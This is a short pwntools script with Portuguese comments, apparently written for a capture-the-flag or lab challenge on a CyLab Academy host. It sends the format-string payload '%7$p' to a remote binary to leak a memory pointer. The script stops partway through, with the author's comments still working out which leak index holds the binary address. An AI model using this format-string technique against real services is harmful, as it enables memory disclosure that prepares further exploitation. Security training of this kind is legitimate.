from pwn import *

binary = './vuln_6'
context.binary = elf = ELF(binary)

p = remote('xebec.cylabacademy.net', 13366)

# Usa o índice 7 direto, que foi onde o ponteiro do binário apareceu no scan limpo
p.sendlineafter(b'Enter your name:', b'%7$p')

response = p.recvline().strip()
log.info(f"Resposta bruta: {response}")

# Extrai o valor hexadecimal limpo
leak = int(response, 16)
log.success(f"Leak obtido (%7$p): {hex(leak)}")

# Subtrai o offset estático do ponteiro do índice 7 (no scan anterior era o 0x...64f5, 
# mas vamos usar o cálculo dinâmico ou o offset fixo da instrução do índice 7)
# Espere: no leak limpo anterior: 0x7db86eb464f5 era libc, o do binário era o 0x5f978d4f72a1 que estava no índice 1!